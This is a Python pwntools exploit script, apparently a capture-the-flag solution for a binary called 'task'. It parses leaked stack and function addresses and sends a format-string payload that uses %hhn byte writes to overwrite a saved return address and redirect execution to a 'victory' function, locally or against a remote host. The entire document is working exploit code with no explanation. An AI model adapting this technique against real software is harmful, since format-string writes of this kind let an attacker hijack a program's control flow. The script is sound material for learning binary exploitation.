from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
    p = gdb.debug(elf.path, '\n'.join([
        "b *func+163",
        "c"
    ]))
elif args.REMOTE:
    host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
    p = remote(host, port)
else:
    p = process(elf.path)


def get_addr(data):
    return int(data.split(b':')[-1].strip().decode(), 16)


p.recvuntil(b'Address')
victory = get_addr(p.recvline())
buf = get_addr(p.recvline())
retaddr = get_addr(p.recvline())
retaddr_addr = buf + 128 + 4*4

print(f'victory: {hex(victory)}')
print(f'buf:     {hex(buf)}')
print(f'retaddr: {hex(retaddr)}')

targets = [(victory >> (i*8)) & 0xFF for i in range(4)]

# retaddr 43th param
# buf 7th

def find_bigger_closest(current, target, mask):
    if current < target:
        return target - current

    incrementer = 1 << (mask << 3)

    while current > target:
        target += incrementer

    return target - current

payload = p32(retaddr_addr) + p32(retaddr_addr+1)
emitted = len(payload)

padding = find_bigger_closest(emitted, targets[0], 1)
emitted += padding
payload += f'%{padding}c%7$hhn'.encode()

padding = find_bigger_closest(emitted, targets[1], 1)
emitted += padding
payload += f'%{padding}c%8$hhn'.encode()

if b'\x0a' in payload:
    print("Repeat, banned char")
    exit(1)

p.sendline(payload)

print(p.clean(1.0))
